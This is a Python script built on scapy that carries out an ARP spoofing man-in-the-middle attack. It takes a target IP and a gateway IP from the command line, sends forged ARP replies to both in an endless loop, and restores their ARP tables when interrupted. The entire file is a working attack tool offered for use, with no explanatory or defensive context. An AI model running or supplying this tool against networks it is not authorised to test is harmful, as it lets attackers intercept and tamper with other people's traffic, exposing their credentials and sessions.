import scapy.all as scapy
import time
import optparse


def getMacAddress(ip):
    arpRequestPacket = scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    broadcastPacket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())
    combinedPacket = broadcastPacket/arpRequestPacket
    answeredList = scapy.srp(combinedPacket,timeout=1,verbose=False)[0]

    return answeredList[0][1].hwsrc

def arpPoisoning(targetIp,poisonedIp):

    targetMac = getMacAddress(targetIp)

    arpResponse = scapy.ARP(op=2,pdst=targetIp,hwdst=targetMac,psrc=poisonedIp)
    scapy.send(arpResponse,verbose=False)
    #scapy.ls(scapy.ARP())

def resetOperation(fooledIp,gatewayIp):

    fooledMac = getMacAddress(fooledIp)
    gatewayMac = getMacAddress(gatewayIp)

    arpResponse = scapy.ARP(op=2,pdst=fooledIp,hwdst=fooledMac,psrc=gatewayIp,hwsrc=gatewayMac)
    scapy.send(arpResponse,verbose=False,count=6)

def getUserInput():
    parseObject = optparse.OptionParser()

    parseObject.add_option("-t", "--target",dest="target_ip",help="Enter Target IP")
    parseObject.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")

    options = parseObject.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP")

    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options

number = 0

user_ips = getUserInput()
userTargetIp = user_ips.target_ip
userGatewayIp = user_ips.gateway_ip

try:
    while True:
        arpPoisoning(userTargetIp,userGatewayIp)
        arpPoisoning(userGatewayIp,userTargetIp)

        number += 2
        print("\rSending packets " + str(number),end="")

        time.sleep(3)

except KeyboardInterrupt:
    print("\nQuit & Reset")
    resetOperation(userTargetIp,userGatewayIp)
    resetOperation(userGatewayIp,userTargetIp)
    